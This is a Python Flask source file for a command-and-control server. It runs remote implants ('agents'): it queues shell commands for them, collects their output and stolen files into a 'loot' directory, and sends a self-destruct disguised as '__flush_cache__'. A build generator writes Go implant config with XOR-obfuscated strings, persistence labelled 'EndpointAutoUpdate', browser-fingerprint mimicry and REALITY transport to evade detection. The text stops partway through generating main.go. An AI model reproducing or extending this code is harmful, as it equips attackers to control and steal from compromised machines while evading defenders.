from flask import Flask, request, jsonify, render_template, send_file, Response, redirect, session, url_for
from werkzeug.utils import secure_filename
from database import get_db_connection, purge_destroyed_agents, purge_retired_build_nonces
from storage_permissions import private_directory
from certificate_storage import publish_certificate_bundle
from crypto import generate_key, encrypt_payload, decrypt_payload
from certificate_probe import (
    measure_certificate_record, ProbeInputError, ProbeDenied,
    REALITY_CERTIFICATE_LIMIT_BYTES,
)
from datetime import datetime, timezone
import base64
import hashlib
import hmac
import json
import re
import sqlite3
import subprocess
import shutil
import tempfile
import threading
import time
import os

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100 MB upload limit

# Keep the framework name out of the application-level Server header.
@app.after_request
def mask_server_header(response):
    response.headers["Server"] = "nginx/1.24.0"
    return response

BUILDS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "builds")
BUILDS_DIR = private_directory(BUILDS_DIR, preserve_execute=True)

LOOT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
LOOT_DIR = private_directory(LOOT_DIR)

STAGED_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "staged")
STAGED_DIR = private_directory(STAGED_DIR)

CERTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs")
CERTS_DIR = private_directory(CERTS_DIR)

AGENT_SRC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "agent")


# Agent route initialization.

def _init_agent_paths():
    """Pull path slugs from the DB, generate them on first run."""
    import secrets

    keys = ["path_checkin", "path_result", "path_upload", "path_files"]

    conn = get_db_connection()
    rows = conn.execute(
        "SELECT key, value FROM server_config WHERE key IN (?, ?, ?, ?)", keys
    ).fetchall()
    stored = {r["key"]: r["value"] for r in rows}

    # Generate any missing paths (first run, or partial DB state)
    for k in keys:
        if k not in stored:
            stored[k] = "/" + secrets.token_hex(4)
            conn.execute(
                "INSERT INTO server_config (key, value) VALUES (?, ?)",
                (k, stored[k]),
            )

    conn.commit()
    conn.close()
    return stored


_agent_paths = _init_agent_paths()

AGENT_PATH_CHECKIN = _agent_paths["path_checkin"]
AGENT_PATH_RESULT  = _agent_paths["path_result"]
AGENT_PATH_UPLOAD  = _agent_paths["path_upload"]
AGENT_PATH_FILES   = _agent_paths["path_files"]


# Operator authentication.

def _init_api_key():
    """Pull the operator API key from the DB, generate it if this is the first run."""
    import secrets

    conn = get_db_connection()
    row = conn.execute(
        "SELECT value FROM server_config WHERE key = 'api_key'"
    ).fetchone()

    if row:
        key = row["value"]
    else:
        key = secrets.token_hex(16)
        conn.execute(
            "INSERT INTO server_config (key, value) VALUES (?, ?)",
            ("api_key", key),
        )
        conn.commit()

    conn.close()
    return key


API_KEY = _init_api_key()


def _init_session_secret():
    """Return a stable random key used only to authenticate operator sessions."""
    import secrets

    conn = get_db_connection()
    try:
        row = conn.execute(
            "SELECT value FROM server_config WHERE key = 'session_secret'"
        ).fetchone()
        if row:
            return row["value"]
        secret = secrets.token_hex(32)
        conn.execute(
            "INSERT INTO server_config (key, value) VALUES ('session_secret', ?)",
            (secret,),
        )
        conn.commit()
        return secret
    finally:
        conn.close()


app.secret_key = _init_session_secret()
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Strict",
)


def _operator_session_valid():
    marker = session.get("operator_auth", "")
    expected = hashlib.sha256(API_KEY.encode()).hexdigest()
    return isinstance(marker, str) and hmac.compare_digest(marker, expected)


@app.before_request
def _require_api_key():
    """Gate every operator endpoint behind the API key."""
    if request.path.startswith("/api/"):
        provided = request.headers.get("X-API-Key", "")
        if not _operator_session_valid() and not hmac.compare_digest(provided, API_KEY):
            return jsonify({"error": "Unauthorized"}), 401


# Dashboard.

@app.route("/")
def dashboard():
    """Render the C2 operator dashboard."""
    if not _operator_session_valid():
        return redirect(url_for("operator_login"))
    response = Response(render_template("index.html"))
    response.headers["Cache-Control"] = "no-store"
    return response


@app.route("/login", methods=["GET", "POST"])
def operator_login():
    """Authenticate before any dashboard HTML is served."""
    if _operator_session_valid():
        return redirect(url_for("dashboard"))

    error = ""
    if request.method == "POST":
        candidate = request.form.get("api_key", "")
        if isinstance(candidate, str) and hmac.compare_digest(candidate, API_KEY):
            session.clear()
            session["operator_auth"] = hashlib.sha256(API_KEY.encode()).hexdigest()
            return redirect(url_for("dashboard"))
        error = "Invalid operator API key."

    response = Response(render_template("login.html", error=error), status=401 if error else 200)
    response.headers["Cache-Control"] = "no-store"
    return response


@app.route("/logout", methods=["POST"])
def operator_logout():
    session.clear()
    return redirect(url_for("operator_login"))


# Agent check-in.

def _agent_secret_hash(secret):
    """Hash a canonical, randomly generated 32-byte agent secret."""
    if not isinstance(secret, str) or len(secret) != 64:
        return None
    try:
        raw = bytes.fromhex(secret)
    except ValueError:
        return None
    if raw.hex() != secret:
        return None
    return hashlib.sha256(raw).hexdigest()


def _agent_status(agent_row):
    """Normalize agent lifecycle status; missing/NULL means active."""
    if agent_row is None:
        return "active"
    try:
        status = agent_row["status"]
    except (KeyError, IndexError):
        return "active"
    return status or "active"


def _agent_authenticated(conn, agent_id, secret, kid=None, allow_destroyed=False):
    digest = _agent_secret_hash(secret)
    if not digest or not isinstance(agent_id, str):
        return False
    agent = conn.execute(
        "SELECT key_id, secret_hash, status FROM agents WHERE id = ?", (agent_id,)
    ).fetchone()
    if not agent or not agent["secret_hash"]:
        return False
    if _agent_status(agent) == "destroyed" and not allow_destroyed:
        return False
    return bool(
        (kid is None or agent["key_id"] == kid) and
        hmac.compare_digest(agent["secret_hash"], digest)
    )

# Payload decryption.

def _get_builds_for_kid(kid: str) -> list:
    """Look up all builds matching a given kid, newest first."""
    conn = get_db_connection()
    rows = conn.execute(
        "SELECT id, encryption_key, transport_mode, decoy_domain FROM builds WHERE key_id = ? ORDER BY id DESC",
        (kid,),
    ).fetchall()
    conn.close()
    return rows


def _decrypt_with_kid(kid: str, enc_data: str) -> tuple[dict | None, str | None, int | None]:
    """
    Given a kid and base64-encoded encrypted payload, find the matching build.
    If multiple builds share the same key_id, iterates candidate keys until one decrypts
    and validates its GCM tag.
    Returns (payload_dict, matching_key_hex, matching_build_id).
    If multiple builds share both the key_id and the same decryption key, matching_build_id
    cannot be attributed without independent provenance and is returned as None.
    """
    candidate_builds = _get_builds_for_kid(kid)
    if not candidate_builds:
        return None, None, None

    matching_candidates = []
    for b in candidate_builds:
        k = b["encryption_key"]
        if not k:
            continue
        try:
            raw = decrypt_payload(k, enc_data)
            data = json.loads(raw)
            matching_candidates.append((data, k, b["id"]))
        except Exception:
            continue

    if not matching_candidates:
        return None, None, None

    if len(matching_candidates) == 1:
        return matching_candidates[0]

    # Multiple builds have keys that successfully decrypt the payload.
    # We cannot attribute the agent to a specific build without independent provenance.
    data, k, _ = matching_candidates[0]
    return data, k, None


def SyncDeviceState():
    """Decrypt the checkin envelope, register/update the agent, return pending tasks encrypted."""
    envelope = request.get_json()

    # Validate envelope
    if not envelope or "kid" not in envelope or "data" not in envelope:
        return jsonify({"error": "Invalid envelope"}), 400

    kid = envelope["kid"]
    try:
        nonce_hex = base64.b64decode(envelope["data"])[:12].hex()
    except Exception:
        return jsonify({"error": "Invalid payload"}), 400

    # Decrypt with matching build candidate
    data, key_hex, build_id = _decrypt_with_kid(kid, envelope["data"])
    if data is None or key_hex is None:
        candidate_builds = _get_builds_for_kid(kid)
        if not candidate_builds:
            return jsonify({"error": "Unknown key_id"}), 403
        return jsonify({"error": "Decryption failed"}), 403

    if (not isinstance(data, dict) or "agent_id" not in data or
            _agent_secret_hash(data.get("agent_secret")) is None):
        return jsonify({"error": "Missing or invalid agent identity"}), 400

    agent_id   = data["agent_id"]
    if not isinstance(agent_id, str) or not agent_id or len(agent_id) > 128:
        return jsonify({"error": "Invalid agent_id"}), 400
    secret_hash = _agent_secret_hash(data["agent_secret"])
    hostname   = data.get("hostname", "unknown")
    agent_os   = data.get("os", "unknown")
    ip         = request.remote_addr

    conn = get_db_connection()

    existing = conn.execute(
        "SELECT id, key_id, secret_hash, status FROM agents WHERE id = ?", (agent_id,)
    ).fetchone()
    if existing and (
        existing["key_id"] != kid or not existing["secret_hash"] or
        not hmac.compare_digest(existing["secret_hash"], secret_hash)
    ):
        conn.close()
        return jsonify({"error": "Invalid agent identity"}), 403
    if existing and _agent_status(existing) == "destroyed":
        conn.close()
        return jsonify({"error": "Agent destroyed"}), 410

    try:
        conn.execute(
            "INSERT INTO seen_nonces (kid, nonce) VALUES (?, ?)",
            (kid, nonce_hex),
        )
    except sqlite3.IntegrityError:
        conn.close()
        return jsonify({"error": "Replay detected"}), 409

    if existing:
        conn.execute(
            "UPDATE agents SET hostname = ?, ip = ?, os = ?, build_id = COALESCE(?, build_id), last_seen = ? WHERE id = ?",
            (hostname, ip, agent_os, build_id, datetime.now(timezone.utc).isoformat(), agent_id),
        )
    else:
        conn.execute(
            "INSERT INTO agents (id, hostname, ip, os, key_id, build_id, secret_hash, last_seen, status) "
            "VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'active')",
            (agent_id, hostname, ip, agent_os, kid, build_id, secret_hash,
             datetime.now(timezone.utc).isoformat()),
        )

    conn.commit()

    # Serialize dispatch across overlapping check-ins. A task is sent at most
    # once; a lost response remains visible as delivery-uncertain for the operator.
    conn.execute("BEGIN IMMEDIATE")
    tasks = conn.execute(
        "SELECT id, command, type FROM tasks WHERE agent_id = ? AND status = 'pending'",
        (agent_id,),
    ).fetchall()

    for task in tasks:
        conn.execute("UPDATE tasks SET status = 'sent' WHERE id = ? AND status = 'pending'", (task["id"],))

    conn.commit()
    conn.close()

    # Encrypt the response before sending it back
    response_body = {
        "status": "ok",
        "tasks": [{"id": t["id"], "command": t["command"], "type": t["type"]} for t in tasks],
    }
    enc = encrypt_payload(key_hex, json.dumps(response_body).encode())
    return jsonify({"kid": kid, "data": enc})


# Task management.

@app.route("/api/task", methods=["POST"])
def submit_task():
    """Queue a command for an agent."""
    data = request.get_json(silent=True)

    if not isinstance(data, dict):
        return jsonify({"error": "Request body must be a JSON object"}), 400
    for field in ("agent_id", "command"):
        value = data.get(field)
        if not isinstance(value, str) or not value.strip() or "\x00" in value:
            return jsonify({"error": f"{field} must be a nonempty string without NUL characters"}), 400

    task_type = data.get("type", "shell")
    if task_type not in ("exec", "shell"):
        return jsonify({"error": "Invalid task type. Must be 'exec' or 'shell'"}), 400

    conn = get_db_connection()
    try:
        agent = conn.execute(
            "SELECT id, status FROM agents WHERE id = ?", (data["agent_id"],)
        ).fetchone()
        if not agent or _agent_status(agent) == "destroyed":
            return jsonify({"error": "Agent not found"}), 404
        cursor = conn.execute(
            "INSERT INTO tasks (agent_id, command, type) VALUES (?, ?, ?)",
            (data["agent_id"], data["command"], task_type),
        )
        task_id = cursor.lastrowid
        conn.commit()
    except sqlite3.Error:
        conn.rollback()
        app.logger.exception("Failed to store task")
        return jsonify({"error": "Could not store task"}), 500
    finally:
        conn.close()

    return jsonify({"status": "ok", "task_id": task_id})


@app.route("/api/tasks/<agent_id>", methods=["GET"])
def get_tasks(agent_id):
    """Get all tasks for a specific agent."""
    conn = get_db_connection()
    tasks = conn.execute(
        "SELECT id, command, type, status, created_at FROM tasks WHERE agent_id = ? ORDER BY created_at DESC",
        (agent_id,),
    ).fetchall()
    conn.close()

    return jsonify({
        "tasks": [
            {
                "id": t["id"],
                "command": t["command"],
                "type": t["type"],
                "status": t["status"],
                "delivery_uncertain": t["status"] == "sent",
                "created_at": t["created_at"],
            }
            for t in tasks
        ]
    })


@app.route("/api/tasks/<int:task_id>/abandon", methods=["POST"])
def abandon_task(task_id):
    """Operator acknowledgment that a sent task will not be automatically resent."""
    conn = get_db_connection()
    try:
        conn.execute("BEGIN IMMEDIATE")
        task = conn.execute("SELECT status FROM tasks WHERE id = ?", (task_id,)).fetchone()
        if not task:
            return jsonify({"error": "Task not found"}), 404
        if task["status"] != "sent":
            return jsonify({"error": "Only sent tasks can be abandoned"}), 409
        conn.execute("UPDATE tasks SET status = 'abandoned' WHERE id = ?", (task_id,))
        conn.commit()
        return jsonify({"status": "ok", "warning": "Delivery was uncertain; creating a new task may execute the command twice"})
    finally:
        conn.close()


# Results.

def submit_result():
    """Decrypt the result envelope from the agent and store the output."""
    envelope = request.get_json()

    # Validate and decrypt
    if not envelope or "kid" not in envelope or "data" not in envelope:
        return jsonify({"error": "Invalid envelope"}), 400

    kid = envelope["kid"]
    try:
        nonce_hex = base64.b64decode(envelope["data"])[:12].hex()
    except Exception:
        return jsonify({"error": "Invalid payload"}), 400

    data, key_hex, _ = _decrypt_with_kid(kid, envelope["data"])
    if data is None or key_hex is None:
        candidate_builds = _get_builds_for_kid(kid)
        if not candidate_builds:
            return jsonify({"error": "Unknown key_id"}), 403
        return jsonify({"error": "Decryption failed"}), 403

    if (not isinstance(data, dict) or
            not isinstance(data.get("task_id"), int) or
            isinstance(data["task_id"], bool) or
            "agent_id" not in data or "agent_secret" not in data):
        return jsonify({"error": "Missing result identity"}), 400
    if data["task_id"] < 1 or data["task_id"] > 9223372036854775807:
        return jsonify({"error": "Invalid task ID"}), 400

    # New agents bind the encrypted acknowledgement to one durable result.
    # Keep an empty report ID valid so already-built agents can transition
    # without losing their pending results.
    report_id = data.get("report_id", "")
    if report_id != "" and (
            not isinstance(report_id, str) or
            not re.fullmatch(r"[0-9a-f]{64}", report_id)
    ):
        return jsonify({"error": "Invalid report ID"}), 400
    output = data.get("output", "")
    if not isinstance(output, str):
        return jsonify({"error": "Result output must be a string"}), 400

    def encrypted_acknowledgement(already_recorded=False):
        acknowledgement = {
            "status": "ok",
            "agent_id": data["agent_id"],
            "task_id": data["task_id"],
            "report_id": report_id,
            "output_sha256": hashlib.sha256(output.encode()).hexdigest(),
            "already_recorded": already_recorded,
        }
        enc = encrypt_payload(key_hex, json.dumps(acknowledgement).encode())
        return jsonify({"kid": kid, "data": enc})

    # Store result and handle self-destruct cleanup
    conn = get_db_connection()
    if not _agent_authenticated(
        conn, data["agent_id"], data["agent_secret"], kid, allow_destroyed=True
    ):
        conn.close()
        return jsonify({"error": "Invalid agent identity"}), 403

    conn.execute("BEGIN IMMEDIATE")
    task = conn.execute(
        "SELECT agent_id, command, status FROM tasks WHERE id = ?", (data["task_id"],)
    ).fetchone()
    if not task or task["agent_id"] != data["agent_id"] or task["status"] not in ("sent", "abandoned", "complete"):
        conn.close()
        return jsonify({"error": "Task not assigned to agent"}), 403

    try:
        conn.execute(
            "INSERT INTO seen_nonces (kid, nonce) VALUES (?, ?)",
            (kid, nonce_hex),
        )
    except sqlite3.IntegrityError:
        conn.close()
        return jsonify({"error": "Replay detected"}), 409

    if task["status"] == "complete":
        result = conn.execute("SELECT output FROM results WHERE task_id = ? ORDER BY id DESC LIMIT 1",
                              (data["task_id"],)).fetchone()
        if not result or result["output"] != output:
            conn.rollback()
            conn.close()
            return jsonify({"error": "Task already completed with a different result"}), 409
        conn.commit()
        conn.close()
        return encrypted_acknowledgement(already_recorded=True)

    conn.execute(
        "INSERT INTO results (task_id, output) VALUES (?, ?)",
        (data["task_id"], output),
    )
    conn.execute("UPDATE tasks SET status = 'complete' WHERE id = ?", (data["task_id"],))

    if task["command"] == "__flush_cache__":
        # Keep a tombstone so lost acknowledgments can retry idempotently.
        # Retain only this flush task/result; drop the rest of the agent's history.
        agent_id = task["agent_id"]
        flush_task_id = data["task_id"]
        conn.execute("""
            DELETE FROM results WHERE task_id IN (
                SELECT id FROM tasks WHERE agent_id = ? AND id != ?
            )
        """, (agent_id, flush_task_id))
        conn.execute(
            "DELETE FROM tasks WHERE agent_id = ? AND id != ?",
            (agent_id, flush_task_id),
        )
        conn.execute(
            "UPDATE agents SET status = 'destroyed', destroyed_at = CURRENT_TIMESTAMP "
            "WHERE id = ?",
            (agent_id,),
        )

    conn.commit()
    conn.close()

    return encrypted_acknowledgement()


@app.route("/api/results/<int:task_id>", methods=["GET"])
def get_results(task_id):
    """Get results for a specific task."""
    conn = get_db_connection()
    results = conn.execute(
        "SELECT id, output, received_at FROM results WHERE task_id = ?",
        (task_id,),
    ).fetchall()
    conn.close()

    return jsonify({
        "results": [
            {
                "id": r["id"],
                "output": r["output"],
                "received_at": r["received_at"],
            }
            for r in results
        ]
    })


# Agents.

@app.route("/api/agents", methods=["GET"])
def get_agents():
    """Return all agents as JSON, enriched with transport metadata from builds."""
    conn = get_db_connection()

    # Single query: LEFT JOIN fetches only the build metadata relevant to
    # the returned agents using the idx_builds_key_id index.
    # An explicit build ID wins. Legacy agents without one can only inherit
    # metadata when their key identifies exactly one build.
    # 1. Exactly one row per agent (API-03), avoiding duplicates when multiple
    #    builds share a key_id.
    # 2. Performance does not scale with unrelated build history (PERF-01).
    # 3. Agents with NULL or empty key_id do not match any build.
    rows = conn.execute("""
        SELECT a.id, a.hostname, a.ip, a.os, a.last_seen,
               COALESCE(b.transport_mode, '') AS transport_mode,
               b.decoy_domain
        FROM agents a
        LEFT JOIN builds b ON b.id = COALESCE(
            a.build_id,
            CASE WHEN a.key_id IS NOT NULL AND a.key_id != '' THEN (
                SELECT b2.id FROM builds b2 WHERE b2.key_id = a.key_id
                GROUP BY b2.key_id HAVING COUNT(*) = 1
            ) END
        )
        WHERE COALESCE(a.status, 'active') != 'destroyed'
        ORDER BY a.last_seen DESC
    """).fetchall()

    conn.close()

    return jsonify({
        "agents": [
            {
                "id": r["id"],
                "hostname": r["hostname"],
                "ip": r["ip"],
                "os": r["os"],
                "last_seen": r["last_seen"],
                "transport_mode": r["transport_mode"] or "",
                "decoy_domain": r["decoy_domain"],
            }
            for r in rows
        ]
    })


@app.route("/api/agents/<agent_id>", methods=["DELETE"])
def delete_agent(agent_id):
    """Queue a self-destruct for the agent. Record stays in the DB until the agent checks in and wipes itself."""
    conn = get_db_connection()

    # Check if agent exists and is still active
    agent = conn.execute("SELECT id, status FROM agents WHERE id = ?", (agent_id,)).fetchone()
    if not agent or _agent_status(agent) == "destroyed":
        conn.close()
        return jsonify({"error": "Agent not found"}), 404

    # Check if a self-destruct task is already pending
    existing = conn.execute(
        "SELECT id FROM tasks WHERE agent_id = ? AND command = '__flush_cache__' AND status = 'pending'",
        (agent_id,),
    ).fetchone()

    if not existing:
        # Queue the self-destruct command
        conn.execute(
            "INSERT INTO tasks (agent_id, command) VALUES (?, '__flush_cache__')",
            (agent_id,),
        )
        conn.commit()

    conn.close()

    return jsonify({"status": "ok", "message": "Self-destruct queued. Agent will wipe on next check-in."})


@app.route("/api/agents/<agent_id>/force", methods=["DELETE"])
def force_delete_agent(agent_id):
    """Force-remove an agent record and all its data from the database (no remote wipe)."""
    conn = get_db_connection()

    conn.execute("""
        DELETE FROM results WHERE task_id IN (
            SELECT id FROM tasks WHERE agent_id = ?
        )
    """, (agent_id,))
    conn.execute("DELETE FROM tasks WHERE agent_id = ?", (agent_id,))
    conn.execute("DELETE FROM agents WHERE id = ?", (agent_id,))

    conn.commit()
    conn.close()

    return jsonify({"status": "ok"})


# Statistics.

@app.route("/api/stats", methods=["GET"])
def get_stats():
    """Return aggregate dashboard statistics."""
    conn = get_db_connection()

    agent_count = conn.execute(
        "SELECT COUNT(*) as c FROM agents WHERE COALESCE(status, 'active') != 'destroyed'"
    ).fetchone()["c"]
    pending_tasks = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status = 'pending'").fetchone()["c"]
    sent_tasks = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status = 'sent'").fetchone()["c"]
    complete_tasks = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status = 'complete'").fetchone()["c"]
    total_builds = conn.execute("SELECT COUNT(*) as c FROM builds").fetchone()["c"]

    conn.close()

    return jsonify({
        "agents": agent_count,
        "pending": pending_tasks,
        "sent": sent_tasks,
        "completed": complete_tasks,
        "builds": total_builds,
    })


# Agent builds.

def _xor_encrypt(key: bytes, plaintext: str) -> str:
    """XOR-encrypt a plaintext string with a multi-byte key, return hex."""
    pt = plaintext.encode()
    ct = bytes(b ^ key[i % len(key)] for i, b in enumerate(pt))
    return ct.hex()


def _compute_cert_pin():
    """Read the server certificate and return the SPKI SHA-256 hex digest.

    Returns None if no certificate exists yet.
    """
    cert_path, _ = _active_tls_paths()
    if not os.path.exists(cert_path):
        return None

    from cryptography.x509 import load_pem_x509_certificate
    from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
    import hashlib

    with open(cert_path, "rb") as f:
        cert = load_pem_x509_certificate(f.read())

    spki_bytes = cert.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
    return hashlib.sha256(spki_bytes).hexdigest()


def _active_tls_paths():
    """Use an atomically replaced PEM bundle, or an existing legacy pair."""
    bundle = os.path.join(CERTS_DIR, "server.pem")
    if os.path.isfile(bundle):
        return bundle, bundle
    return os.path.join(CERTS_DIR, "server.crt"), os.path.join(CERTS_DIR, "server.key")


def _generate_config_go(server_url, jitter_min, jitter_max, persist_method,
                        profile_id=1, locale="en-US,en;q=0.9",
                        key_hex="", key_id="",
                        path_checkin="/api/checkin", path_result="/api/result",
                        path_upload="/api/upload", path_files="/api/files/",
                        cert_pin="",
                        transport_mode="http",
                        reality_vps_addr="", decoy_domain="",
                        reality_pubkey="", reality_shortid="",
                        vless_uuid=""):
    """Generate a config.go file with the given settings."""

    # fresh XOR key for this build
    xor_key = os.urandom(32)
    xor_key_hex = xor_key.hex()

    persistence = persist_method != "none"
    is_reality = transport_mode == "reality"

    # encrypt sensitive strings so they don't show up as plaintext in the binary
    enc_server_url   = _xor_encrypt(xor_key, server_url)
    enc_checkin_path = _xor_encrypt(xor_key, path_checkin)
    enc_result_path  = _xor_encrypt(xor_key, path_result)
    enc_upload_path  = _xor_encrypt(xor_key, path_upload)
    enc_files_path   = _xor_encrypt(xor_key, path_files)
    enc_flush_cmd    = _xor_encrypt(xor_key, "__flush_cache__")
    enc_svc_label    = _xor_encrypt(xor_key, "EndpointAutoUpdate")
    enc_cert_pin     = _xor_encrypt(xor_key, cert_pin) if cert_pin else ""
    enc_update_strat = _xor_encrypt(xor_key, persist_method) if persistence else ""

    # REALITY-specific obfuscated strings (empty when not REALITY mode)
    enc_transport_mode = _xor_encrypt(xor_key, transport_mode) if is_reality else ""
    enc_vps_addr       = _xor_encrypt(xor_key, reality_vps_addr) if is_reality else ""
    enc_decoy_domain   = _xor_encrypt(xor_key, decoy_domain) if is_reality else ""
    enc_pubkey         = _xor_encrypt(xor_key, reality_pubkey) if is_reality else ""
    enc_shortid        = _xor_encrypt(xor_key, reality_shortid) if is_reality else ""
    enc_vless_uuid     = _xor_encrypt(xor_key, vless_uuid) if is_reality else ""

    # Map browser profile IDs to uTLS fingerprint names for REALITY
    fingerprint_map = {1: "chrome", 2: "chrome", 3: "firefox", 4: "firefox", 5: "safari"}
    reality_fingerprint = fingerprint_map.get(profile_id, "chrome")

    # Conditional import: only include the reality package for REALITY builds.
    # Non-REALITY builds never reference it, so no unused-import error and no
    # binary size impact from the reality/ source files sitting in the tree.
    if is_reality:
        imports_block = '''import (
\t"crypto/rand"
\t"encoding/base64"
\t"encoding/hex"
\t"fmt"
\t"net/http"
\t"strings"
\t"time"

\t"endpoint-telemetry/funcs"
\t"endpoint-telemetry/funcs/reality"
)'''
    else:
        imports_block = '''import (
\t"crypto/rand"
\t"crypto/tls"
\t"encoding/hex"
\t"fmt"
\t"net/http"
\t"strings"
\t"time"

\t"endpoint-telemetry/funcs"
)'''

    # REALITY variable declarations (only present in REALITY builds)
    reality_vars = ""
    if is_reality:
        reality_vars = f"""
\t// REALITY transport credentials (XOR-obfuscated)
\tTransportMode       string
\tRealityVPSAddr      string
\tRealityDecoyDomain  string
\tRealityPubKey       string
\tRealityShortID      string
\tVlessUUID           string"""

    # REALITY initialization block for InitializeTelemetry()
    if is_reality:
        transport_init = f'''\t// -- REALITY transport --
\tTransportMode      = funcs.ResolveConfig(obfKey, "{enc_transport_mode}")
\tRealityVPSAddr     = funcs.ResolveConfig(obfKey, "{enc_vps_addr}")
\tRealityDecoyDomain = funcs.ResolveConfig(obfKey, "{enc_decoy_domain}")
\tRealityPubKey      = funcs.ResolveConfig(obfKey, "{enc_pubkey}")
\tRealityShortID     = funcs.ResolveConfig(obfKey, "{enc_shortid}")
\tVlessUUID          = funcs.ResolveConfig(obfKey, "{enc_vless_uuid}")

\t// Decode REALITY credentials from their string representations
\tpubKeyBytes, err := base64.RawURLEncoding.DecodeString(RealityPubKey)
\tif err != nil {{
\t\t// Try standard base64 as fallback
\t\tpubKeyBytes, err = base64.StdEncoding.DecodeString(RealityPubKey)
\t\tif err != nil {{
\t\t\tpanic("config: invalid REALITY public key: " + err.Error())
\t\t}}
\t}}
\tshortIdBytes, err := hex.DecodeString(RealityShortID)
\tif err != nil {{
\t\tpanic("config: invalid REALITY short ID: " + err.Error())
\t}}
\tuuidCleaned := strings.ReplaceAll(VlessUUID, "-", "")
\tuuidBytes, err := hex.DecodeString(uuidCleaned)
\tif err != nil || len(uuidBytes) != 16 {{
\t\tpanic("config: invalid VLESS UUID")
\t}}

\trealityCfg := &reality.Config{{
\t\tServerName:  RealityDecoyDomain,
\t\tFingerprint: "{reality_fingerprint}",
\t\tPublicKey:   pubKeyBytes,
\t\tShortId:     shortIdBytes,
\t}}
\tbaseTransport := reality.NewHTTPTransport(&reality.TransportConfig{{
\t\tVPS:      RealityVPSAddr,
\t\tReality:  realityCfg,
\t\tUUID:     uuidBytes,
\t\tDestIP:   "127.0.0.1",
\t\tDestPort: 5000,
\t}})'''
    else:
        transport_init = '''\t// Clone the default transport so we can set TLS options without touching
\t// the global default. If a pin is set, disable CA verification (which would
\t// reject self-signed certs) and replace it with the SPKI pin check.
\tbaseTransport := http.DefaultTransport.(*http.Transport).Clone()

\tif CertPin != "" {
\t\tbaseTransport.TLSClientConfig = &tls.Config{
\t\t\tInsecureSkipVerify: true,
\t\t\tVerifyPeerCertificate: funcs.MakePinVerifier(CertPin),
\t\t}
\t}'''

    return f'''package main

{imports_block}

var (
\t// XOR key for runtime string decoding (generated per build)
\tobfKey = parseDiagnosticKey("{xor_key_hex}")

\t// Sensitive strings decoded at init time
\tTelemetryEndpoint string
\tPathCheckin       string
\tPathResult        string
\tPathUpload        string
\tPathFiles         string
\tFlushCommand      string
\tServiceTag        string
\tUpdateStrategy    string

\tSyncDelayMin  = {jitter_min} * time.Second
\tSyncDelayMax  = {jitter_max} * time.Second
\tProfileID     = {profile_id}
\tLocale        = "{locale}"
\tEndpointID    string
\tAgentSecret   string
\tEnablePersist = {str(persistence).lower()}

\t// Per-build AES-256-GCM key
\tKeyID         = "{key_id}"
\tEncryptionKey = parseDiagnosticKey("{key_hex}")

\t// SPKI SHA-256 pin of the server TLS certificate (empty = no pinning)
\tCertPin string{reality_vars}
)

// parseDiagnosticKey decodes a hex string into []byte, panicking on failure.
// If this panics at startup the binary was built with a malformed key.
func parseDiagnosticKey(s string) []byte {{
\tb, err := hex.DecodeString(s)
\tif err != nil {{
\t\tpanic("config: invalid key hex: " + err.Error())
\t}}
\treturn b
}}

func assignEndpointID() string {{
\tb := make([]byte, 16)
\trand.Read(b)
\tb[6] = (b[6] & 0x0f) | 0x40 // version 4
\tb[8] = (b[8] & 0x3f) | 0x80 // variant 10
\treturn fmt.Sprintf("%08x-%04x-%04x-%04x-%012x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}}

func assignAgentSecret() string {{
\tb := make([]byte, 32)
\tif _, err := rand.Read(b); err != nil {{
\t\tpanic("config: cannot generate agent secret: " + err.Error())
\t}}
\treturn hex.EncodeToString(b)
}}

func InitializeTelemetry() {{
\t// Decode all XOR-obfuscated strings into memory on startup.
\tTelemetryEndpoint = funcs.ResolveConfig(obfKey, "{enc_server_url}")
\tPathCheckin       = funcs.ResolveConfig(obfKey, "{enc_checkin_path}")
\tPathResult        = funcs.ResolveConfig(obfKey, "{enc_result_path}")
\tPathUpload        = funcs.ResolveConfig(obfKey, "{enc_upload_path}")
\tPathFiles         = funcs.ResolveConfig(obfKey, "{enc_files_path}")
\tFlushCommand      = funcs.ResolveConfig(obfKey, "{enc_flush_cmd}")
\tServiceTag        = funcs.ResolveConfig(obfKey, "{enc_svc_label}")
\tfuncs.ServiceLabel = ServiceTag
\tif "{enc_update_strat}" != "" {{
\t\tUpdateStrategy = funcs.ResolveConfig(obfKey, "{enc_update_strat}")
\t\tfuncs.UpdateStrategy = UpdateStrategy
\t}}
\tif "{enc_cert_pin}" != "" {{
\t\tCertPin = funcs.ResolveConfig(obfKey, "{enc_cert_pin}")
\t}}

\t// If a pin is baked in but the URL is HTTP, something went wrong at build time.
\t// Panic rather than run in a broken state where pinning is silently skipped.
\tif CertPin != "" && !strings.HasPrefix(TelemetryEndpoint, "https://") {{
\t\tpanic("config: cert pin is set but server URL is not HTTPS")
\t}}

\tEndpointID = assignEndpointID()
\tAgentSecret = assignAgentSecret()

\tprofile, ok := funcs.Profiles[ProfileID]
\tif !ok {{
\t\tprofile = funcs.Profiles[1] // fallback to Chrome/Windows
\t}}

\t// Set Accept-Language from the locale baked in at build time
\tprofile.Headers["Accept-Language"] = Locale

{transport_init}

\t// Swap in our custom client so all outbound requests go through the
\t// browser profile transport rather than the plain default client.
\thttp.DefaultClient = &http.Client{{
\t\tTransport: &funcs.UATransport{{
\t\t\tBase:    baseTransport,
\t\t\tProfile: profile,
\t\t}},
\t}}

}}

'''


def _generate_main_go(persist_method):
    """Generate main.go, optionally with persistence call."""
    persist_block = ""
    if persist_method != "none":
        persist_block = """
\tif EnablePersist {{
\t\t_ = funcs.InstallAutoUpdater()
\t}}
"""

    return f'''package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
